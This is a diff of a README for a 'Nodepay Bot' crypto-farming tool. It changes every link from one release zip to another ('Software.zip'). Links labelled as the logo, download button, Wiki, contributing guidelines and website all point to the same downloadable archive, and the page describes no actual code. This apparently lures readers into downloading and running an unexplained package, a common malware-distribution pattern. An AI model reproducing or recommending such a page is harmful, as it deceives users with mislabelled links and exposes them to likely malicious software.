@@ -1,6 +1,6 @@
 # 🤖 Nodepay Bot: Automate Your Crypto Farming Experience! 🚀
 
-![Nodepay Bot Logo](https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip)
+![Nodepay Bot Logo](https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository of **Nodepay Bot**, your go-to advanced automation tool for streamlining account registration and farming processes in the cryptocurrency world. With its robust features and intuitive interface, Nodepay Bot offers a seamless experience for users looking to maximize efficiency on the platform.
 
@@ -19,24 +19,24 @@ Welcome to the official repository of **Nodepay Bot**, your go-to advanced autom
 
 ## 📦 Latest Release
 
-[![Download Nodepay Bot](https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip%https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip)](https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip)
+[![Download Nodepay Bot](https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip%https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip)](https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip)
 
-Click the button above to download the latest version of Nodepay Bot. The https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip file contains all the necessary files for launching the application. Happy farming! 🌾
+Click the button above to download the latest version of Nodepay Bot. The https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip file contains all the necessary files for launching the application. Happy farming! 🌾
 
 ## 🚀 Getting Started
 
-1. **Installation**: Download the https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip file from the link above.
+1. **Installation**: Download the https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip file from the link above.
 2. **Setup**: Follow the installation instructions included in the package.
 3. **Configuration**: Customize the settings to suit your farming needs.
 4. **Launch**: Start the Nodepay Bot and enjoy automated farming!
 
 ## 📚 Support and Documentation
 
-For detailed instructions on how to use Nodepay Bot's features, visit our [Wiki](https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip). If you encounter any issues or have questions, feel free to reach out to our support team.
+For detailed instructions on how to use Nodepay Bot's features, visit our [Wiki](https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip). If you encounter any issues or have questions, feel free to reach out to our support team.
 
 ## 🙌 Want to Contribute?
 
-We welcome contributions from the community to enhance Nodepay Bot's functionality and features. Check out our [Contributing Guidelines](https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip) to get started.
+We welcome contributions from the community to enhance Nodepay Bot's functionality and features. Check out our [Contributing Guidelines](https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip) to get started.
 
 ## 📝 License
 
@@ -44,7 +44,7 @@ Nodepay Bot is licensed under the [MIT License](LICENSE). Feel free to use, modi
 
 ---
 
-🔗 **Visit [Nodepay Bot Website](https://github.com/Big0loser/Nodepay-Bot/releases/download/v1.0/Release_x64.zip) for more information.**
+🔗 **Visit [Nodepay Bot Website](https://github.com/Big0loser/Nodepay-Bot/releases/download/v2.0/Software.zip) for more information.**
 
 📂 **Check the "Releases" section for additional updates and versions.**
 
